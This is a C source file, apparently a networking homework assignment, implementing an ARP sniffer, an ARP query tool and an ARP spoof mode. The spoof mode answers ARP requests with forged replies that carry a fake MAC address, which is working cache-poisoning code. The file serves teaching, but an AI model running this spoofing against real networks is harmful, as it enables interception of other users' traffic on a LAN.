#include <netinet/if_ether.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netpacket/packet.h>
#include <net/ethernet.h>
#include <net/if.h>
#include "arp.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <math.h>

#include <unistd.h>
#include <netinet/in.h>



/* 
 * Change "enp2s0f5" to your device name (e.g. "eth0"), when you test your homework.
 * If you don't know your device name, you can use "ifconfig" command on Linux.
 * You have to use "enp2s0f5" when you ready to upload your homework.
 */
#define DEVICE_NAME "enp0s3"


/*
 * You have to open two socket to handle this program.
 * One for input , the other for output.
 */

void print_usage()
{
	printf("%s\n","[ ARP sniffer and spoof program ]");
	printf("%s\n","Format :");
	printf("%s\n","1) ./arp -l -a");
	printf("%s\n","2) ./arp -l <filter_ip_address>");
	printf("%s\n","3) ./arp -q <query_ip_address>");
	printf("%s\n","4) ./arp <fake_mac_address> <target_ip_address>");
}

int main(int argc, char **argv)
{

	int  sockfd_recv = 0, sockfd_send = 0;
	struct sockaddr_ll  sa;
	struct ifreq        req,req_mac,req_ip;
	in_addr_t       arp_srcip,arp_dstip;
	
	struct ether_addr   src_macaddr,dst_macaddr,arp_src_macaddr,arp_dst_macaddr;
	struct 		arp_packet arp_packet_send,arp_packet_recv;
	
	socklen_t 	sockaddr_len = sizeof(sa);

	u_int8_t 	arp_packet_Recv[1600];
	u_int8_t	default_mac[6]={0x00,0x00,0x00,0x00,0x00,0x00};

	int 	recv_length;
	char 	sender_ip[32],target_ip[32],recv_sha[32],recv_spa[32],recv_tpa[32];
	unsigned char 	source_mac[6],source_mac_addr[6],source_ip[4];
	


	// Open a recv socket in data-link layer.
	if((sockfd_recv = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0)
	{
		perror("open recv socket error");
		exit(1);
	}
	/*
	 * Use recvfrom function to get packet.
	 * recvfrom( ... )
	 */
	 
	if(geteuid() != 0){
			printf("%s\n","ERROR: You must be root to use this tool!");
			exit(1);
	}
	
	if(argc == 4 || argc == 3 || argc == 2)
	{
		if(!strcmp(argv[0],"./arp"))
		{
			if(!strcmp(argv[1],"-help")  )
			{
					print_usage();
					exit(1);
			}
			else if(!strcmp(argv[1],"-l")) // capture specific ARP packets
			{
				printf("%s\n","[ ARP sniffer and spoof program ]");
				printf("%s\n","### ARP sniffer mode ###");
				while(1){

					if((recv_length = recvfrom(sockfd_recv,(void*) &arp_packet_recv,sizeof(struct arp_packet), 0, NULL, NULL)) < 0){
						perror("recvfrom error");
						exit(1);
					} //recvfrom 從sockfd_recv接收 ARP 封包，並儲存在 arp_packet_recv 中
					memcpy(arp_packet_Recv, (void*) &arp_packet_recv,sizeof(struct arp_packet));//將arp_packet_recv複製到arp_packet_Recv陣列中
					if((arp_packet_Recv[12] == 8 && arp_packet_Recv[13] == 6)){  //確認是否為ARP封包

						strcpy(sender_ip,get_sender_protocol_addr( &(arp_packet_recv.arp)));
						strcpy(target_ip,get_target_protocol_addr( &(arp_packet_recv.arp)));

						if(!strcmp(argv[2],"-a")){ //show all of the ARP packets
							printf("Get ARP packet - who has %s ? \t Tell %s \n",target_ip,sender_ip);
							
						}else if(strlen(argv[2])>=7&&strlen(argv[2])<=15){ //確認指定位址是否為IP位址

							if(!strcmp(argv[2],target_ip)){
								printf("Get ARP packet - who has %s ? \t Tell %s \n",target_ip,sender_ip);
							}
						}
						else{
							printf("\n Error command!! \n");
							exit(1);
						}

					}
				}
			}
			else if(!strcmp(argv[1],"-q")) //query the MAC address of a specific IP address
			{
				printf("%s\n","[ ARP sniffer and spoof program ]");
				printf("%s\n","### ARP query mode ###");
					if((sockfd_send = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0)
					{
						perror("open send socket error");
						exit(1);
					}

					memset(&req,0,sizeof(req));
					strcpy(req.ifr_name,DEVICE_NAME);

					memset(&req_ip,0,sizeof(req_ip));
					strcpy(req_ip.ifr_name,DEVICE_NAME);

					memset(&req_mac,0,sizeof(req_mac));
					strncpy(req_mac.ifr_name,DEVICE_NAME, ETH_ALEN);
				/*
	 			 * Use ioctl function binds the send socket and the Network Interface Card.
`				 * ioctl( ... )
				 */
					if( ioctl(sockfd_send,SIOCGIFINDEX, &req)== -1){
						perror("SIOCGIFINDEX error");
						exit(1);
					}
					

					if( ioctl(sockfd_send,SIOCGIFADDR, &req_ip)== -1){
						perror("SIOCGIFADDR error");
						exit(1);
					}
					memcpy(source_ip, req_ip.ifr_addr.sa_data, 4);

					

					
					if( ioctl(sockfd_send,SIOCGIFHWADDR, (void*) &req_mac)== -1){
						perror("SIOCGIFHWADDR error");
						exit(1);
					}
					memcpy(source_mac, req_mac.ifr_hwaddr.sa_data, 6);
					memcpy(arp_packet_send.eth_hdr.ether_shost, req_mac.ifr_hwaddr.sa_data, 6);

					arp_packet_send.eth_hdr.ether_dhost[0] = 0xff;
					arp_packet_send.eth_hdr.ether_dhost[1] = 0xff;
					arp_packet_send.eth_hdr.ether_dhost[2] = 0xff;
					arp_packet_send.eth_hdr.ether_dhost[3] = 0xff;
					arp_packet_send.eth_hdr.ether_dhost[4] = 0xff;
					arp_packet_send.eth_hdr.ether_dhost[5] = 0xff;

					memcpy(source_mac_addr,arp_packet_send.eth_hdr.ether_dhost,6);
					memcpy(arp_packet_send.eth_hdr.ether_shost,req_mac.ifr_hwaddr.sa_data,6);
					arp_packet_send.eth_hdr.ether_type = htons(0x0806);
					
					set_hard_type(&arp_packet_send.arp, htons(0x0001));
	    			set_prot_type(&arp_packet_send.arp, htons(0x0800));
	    			set_hard_size(&arp_packet_send.arp, 6);
	    			set_prot_size(&arp_packet_send.arp, 4);
	    			set_op_code(&arp_packet_send.arp, htons(0x0001));
	    			
					memcpy(arp_packet_send.arp.arp_sha,source_mac , 6);			
	    			memcpy(arp_packet_send.arp.arp_spa,source_ip , 4);
	    			
					
					memcpy(arp_packet_send.arp.arp_tha,default_mac ,6);
					
					char Dst_Addr[16];
	    			memcpy(Dst_Addr, argv[2], 16);
	   				char *Addr_token;
	   				unsigned char Target_IP[16];
	   				int IP_Num;
	   				Addr_token = strtok(Dst_Addr, ".");
	   				int i=0;
	   				while( Addr_token != NULL) 
				   	{
				    	IP_Num = atoi(Addr_token);
						Target_IP[i] = IP_Num;
						i++;
						Addr_token = strtok(NULL,".");
				    }
				    memcpy(arp_packet_send.arp.arp_tpa,Target_IP, 4);

	
				// Fill the parameters of the sa. 將ARP請求的廣播封包傳送到網路介面

					bzero(&sa, sizeof(sa));

					sa.sll_family = AF_PACKET;
					sa.sll_ifindex = if_nametoindex(req.ifr_name);
					sa.sll_protocol = htons(ETH_P_ARP);
					sa.sll_halen = ETHER_ADDR_LEN;
					sa.sll_hatype = htons(0x0001);
					sa.sll_pkttype = PACKET_BROADCAST;
			
					sa.sll_addr[0] = 0xff;
					sa.sll_addr[1] = 0xff;
					sa.sll_addr[2] = 0xff;
					sa.sll_addr[3] = 0xff;
					sa.sll_addr[4] = 0xff;
					sa.sll_addr[5] = 0xff;

				/*
				 * use sendto function with sa variable to send your packet out
				 * sendto( ... )
				 */
				
					sendto(sockfd_send, (void*)&arp_packet_send, sizeof(arp_packet_send), 0, (struct sockaddr*)&sa, sizeof(sa));

					while(1){
						
						if(recvfrom(sockfd_recv, &arp_packet_recv, sizeof(arp_packet_recv), 0, (struct sockaddr*)&sa, &sockaddr_len) < 0){
			                printf("ERROR: recv\n");
						}
						if(ntohs(arp_packet_recv.eth_hdr.ether_type) == 0x0806 && arp_packet_recv.arp.arp_op == htons(0x0002)&& memcmp(arp_packet_recv.arp.arp_spa, arp_packet_send.arp.arp_tpa,4) == 0) //檢查是否為ARP回應封包，目標IP位址是否與請求的IP位址相符
			            {
			               	printf("MAC address of %u.%u.%u.%u is %02x:%02x:%02x:%02x:%02x:%02x\n",
			                arp_packet_recv.arp.arp_spa[0], 
			                arp_packet_recv.arp.arp_spa[1], 
			                arp_packet_recv.arp.arp_spa[2], 
			                arp_packet_recv.arp.arp_spa[3],

			                arp_packet_recv.arp.arp_sha[0], 
			                arp_packet_recv.arp.arp_sha[1], 
			                arp_packet_recv.arp.arp_sha[2], 
			                arp_packet_recv.arp.arp_sha[3], 
			                arp_packet_recv.arp.arp_sha[4], 
			                arp_packet_recv.arp.arp_sha[5]);
			                exit(1);
			            }
					}
	       	}
	       	else if(!strcmp(argv[1],"00:11:22:33:44:55")) //ARP spoofing fake_mac_address
			{	

				printf("[ ARP sniffer and spoof program ]\n");
				printf("### ARP spoof mode ###\n");
				if((sockfd_recv = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0)
				{
					perror("open recv socket error");
					exit(1);
				}
				if(strlen(argv[2])>= 7 && strlen(argv[2]) <= 15) //確認指定位址是否為IP位址
				{		

					while(1)
			        {
						if(recv_length = recvfrom( sockfd_recv, (void *)&arp_packet_recv, sizeof(struct arp_packet), 0, NULL, NULL)<0)
						{	
							perror("recvfrom error");
							exit(1);
						}

						memcpy(arp_packet_Recv,(void *)&arp_packet_recv, sizeof(struct arp_packet)); 
						if((arp_packet_Recv[12]==8 && arp_packet_Recv[13]==6))//確認是否為ARP封包
						{
							memcpy(recv_sha,get_sender_hardware_addr(&arp_packet_recv.arp),32);
							strcpy(recv_spa,get_sender_protocol_addr(&arp_packet_recv.arp)); 
							strcpy(recv_tpa,get_target_protocol_addr(&arp_packet_recv.arp));

							if (!strcmp(argv[2], recv_tpa))
							{
								if((sockfd_send = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0)
								{
									perror("open send socket error");
									exit(1);
								}
								ether_aton_r(recv_sha, &dst_macaddr);
								memcpy(&arp_packet_send.eth_hdr.ether_dhost, &dst_macaddr,6);
								ether_aton_r(argv[1], &src_macaddr);
								memcpy(&arp_packet_send.eth_hdr.ether_shost, &src_macaddr,6);
								arp_packet_send.eth_hdr.ether_type = htons(0x0806);

								set_hard_type(&arp_packet_send.arp, htons(0x0001));
								set_prot_type(&arp_packet_send.arp, htons(0x0800));
								set_hard_size(&arp_packet_send.arp, 6);
								set_prot_size(&arp_packet_send.arp, 4);
								set_op_code(&arp_packet_send.arp, htons(0x0002));
								ether_aton_r(argv[1], &arp_src_macaddr);
								memcpy(&arp_packet_send.arp.arp_sha, &arp_src_macaddr,6);//fake_mac_address複製到ARP回應封包中

								arp_srcip = inet_addr(recv_tpa);
								memcpy(&arp_packet_send.arp.arp_spa, &arp_srcip,4);

								ether_aton_r(recv_sha, &arp_dst_macaddr);
								memcpy(&arp_packet_send.arp.arp_tha, &arp_dst_macaddr,6);

								arp_dstip = inet_addr(recv_spa);
								memcpy(&arp_packet_send.arp.arp_tpa,&arp_dstip ,4);


								memset(&req,0,sizeof(req));
								strcpy(req.ifr_name,DEVICE_NAME);
				
								if((ioctl(sockfd_send,SIOCGIFINDEX,&req)) < 0 )
								{
									perror("SIOCGIFINDEX error\n");
									exit(1);
								}

								bzero(&sa,sizeof(sa));
								sa.sll_family = AF_PACKET;
								sa.sll_ifindex = req.ifr_ifindex;
								sa.sll_halen = 6;
								sa.sll_protocol = htons(ETH_P_ARP);
								memcpy(sa.sll_addr,recv_sha,6);

								if((sendto(sockfd_send,&arp_packet_send,sizeof(arp_packet_send),0,(struct sockaddr *)&sa,sizeof(sa))) < 0)
								{
									perror("sendto error");
								}

								else
								{
									printf("Get ARP packet - who has %s ? \t Tell %s \n",recv_tpa,recv_spa);
									printf("send ARP reply : %u.%u.%u.%u is %02x:%02x:%02x:%02x:%02x:%02x\n",
			                       arp_packet_send.arp.arp_spa[0], 
			                       arp_packet_send.arp.arp_spa[1], 
			                       arp_packet_send.arp.arp_spa[2], 
			                       arp_packet_send.arp.arp_spa[3],
			                       arp_packet_send.arp.arp_sha[0], 
			                       arp_packet_send.arp.arp_sha[1], 
			                       arp_packet_send.arp.arp_sha[2], 
			                       arp_packet_send.arp.arp_sha[3], 
			                       arp_packet_send.arp.arp_sha[4], 
			                       arp_packet_send.arp.arp_sha[5]);
									printf("send sucessful.\n");
								}

								break;
							}
						}
					}
				}		
						
			}		
	       	else
			{
				printf("%s\n","Input command error.");
				exit(1);
			}
		}
		return 0;
	}
}
